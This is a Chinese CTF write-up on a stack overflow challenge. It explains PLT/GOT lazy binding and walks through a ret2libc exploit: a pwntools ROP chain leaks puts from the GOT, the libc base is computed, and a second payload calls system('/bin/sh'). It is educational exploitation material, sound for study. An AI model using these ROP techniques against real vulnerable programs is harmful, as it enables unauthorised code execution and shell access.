首先来了解一下什么是动态链接吧
先简单带过一下,
因为如果将所有的函数都用静态链接放到程序里面,那就有浪费内存和磁盘空间的问题,在这个基础上,动态连接诞生了
在linux中,动态连接库还存在一个lazyload机制,只有函数在被调用时才进行连接,而具体的连接过程如下:
这里会使用两个重要的东西,plt表(Procedure Linkage Table),got表(Global Offset Table)

模拟一下,程序第一次调用puts时:
`call puts@plt` //调用plt里面的puts
查询got表里面的有没有puts的函数地址   ->没有
动态链接器找到libc里面的puts函数
将真实地址写入got表
跳转real_puts

在第二次call puts的时候就可以直接查got表里面的函数实现跳转了

# 利用libc
那我们到底为什么要想方法来读取got表的leak呢
核心目的还是为了找到system函数,虽然程序里面并没有用到它,但程序用到的puts函数是libc库里面的,
只要找到了puts函数的地址,再通过libc文件获取puts在libc库的相对位置(也就是偏移),就可以获得libc库在内存里面的基地址了

这里我开始存在一些疑问:libc是会在启动时全部加载进内存吗?
某种意义上,是的!不过这里指的是虚拟内存
在程序启动时会启动动态链接器ld.so来读取程序的依赖信息
然后**直接将libc映射到虚拟内存里面**(注意是虚拟内存)
关于上面说的lazyload,他是用来**解析**函数地址的,而不管加载虚拟地址
所以我们上面的操作可以是实现
*****
我们可以直接用gdb查到got表里面各个函数的位置
在开始运行后输入`got`指令就行了
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /mnt/c/Users/fszz/Desktop/vuln:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
[0x404020] write@GLIBC_2.2.5 -> 0x401040 ◂— endbr64
[0x404028] setbuf@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
[0x404030] read@GLIBC_2.2.5 -> 0x401060 ◂— endbr64
```
注意前面方括号里面的才是我们想要的got表的实际地址,后面箭头指向的地址是got表储存的地址

然后需要用put来输出后面got表的地址,先找到puts函数在plt里的地址(注意,这里不是真正的puts,只是plt提供的跳板),这里使用gdb,直接用`p puts`就行
还要将想输出的got表的地址放进put函数的参数里面,用ROPgadget找一个`pop rdi`的gadget就可以
最后不太一样,我们并没有拿到shell,所以要在本次的运行时在进行一些操作,不能直接退出
可以再次跳转main函数,重新执行程序

>有三个'不同'的puts函数
>1. puts_plt      这个是充当一个跳板,我们可以在本地分析时找到它,但不能用它来推出libc的基址,它存的是跳向put_got的相关
>2. puts_got     这里面在运行一次后存的是put_real的地址
>3. puts_real     想要的真实地址
>在不开启pie时前两个是不变的,但动态加载的libc中的puts_real是会变的

综上就可以这样排栈

| 栈顶          |                     |
| ----------- | ------------------- |
| a*40        |                     |
| pop rdi/ret | gadget              |
| puts_got    | (参数)                |
| puts_plt    | 调用puts输出真实puts_addr |
| main        | 跳回main函数            |
可能会产生这样的疑问(我自己产生的())为什么这里没有ret也能跳回main?
因为前面调用的 puts_libc是一个函数,函数末尾通常都会加上一个ret

这样我们就获得了puts的真实地址
哦对了函数的反汇编长这样
```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(s: "In last task, I was hacked by t0hka.");
  puts(s: "And turns me into a repeater.");
  puts(s: "Now I will repeat what you say.");
  puts(s: "By the way, I removed the system function this time.");
  read(fd: 0, buf, nbytes: 0x60u);
  return write(fd: 1, buf, n: 0x60u);
}
```
写脚本吧
```python
put_got =  0x404018
gadget = 0x00000000004012c3#pop rdi
main_addr = 0x40120b
puts_libc = 0x401070
ret = 0x000000000040101a 

payload = b'a'*40
payload += p64(gadget)
payload += p64(put_got)#got表的位置,传入参数
payload += p64(puts_libc)#调用puts函数,输出put的真实地址
payload += p64(main_addr)

p.recvuntil(a)
p.send(payload)
p.recv(0x60)#因为会puts0x60大小
puts_realaddr = u64(p.recv(6).ljust(8, b"\x00"))#在高位补两个零字节
```
这里注意Linux的64位程序地址只用了48位，即6个字节,所以收6个字节
然后再在后面补两位
# 解析libc基址
这里直接用pwn的elf函数,可以读取libc文件中puts和system的位置
```python
libc = ELF("./libc-2.31.so")

libc_bases = puts_real - libc.sym['puts']
libc_system = libc_bases + libc.sym['system']
binsh_addr = libc_bases + next(libc.search(b"/bin/sh"))
#p由于py的search返回的是迭代器,所以用next获取下一个也是第一个元素
```
这样就可以得到system和binsh了

# 得到结果
下面就可以按照老方法执行system函数啦
```python
payload = b'a'*40
payload+=p64(ret)
payload += p64(gadget)
payload += p64(binsh_addr)
payload += p64(libc_system)

p.recvuntil(a)
p.send(payload)
p.recv(0x60)
p.interactive()
```
注意到这里多加了一个意义不明的ret
是为了对齐16字节的栈空间,
在遇到system等一些些函数的时候可能要对齐

# 关于libc文件替换
题目的远程环境libc和本地的不一定相同,但是题目会给我们对应的libc文件,所以可以在本地分析时替换
ld.so 和 libc.so 两个文件
ld.so是动态链接器,负责将libc与程序连接
libc.so是c标准库
可以用下面的指令来修改libc文件
```shell
cd ~/ctf
patchelf --set-interpreter ./ld-2.31.so ./vuln 
patchelf --replace-needed libc.so.6 libc-2.31.so ./vuln patchelf --set-rpath /home/fszz/ctf ./vuln
```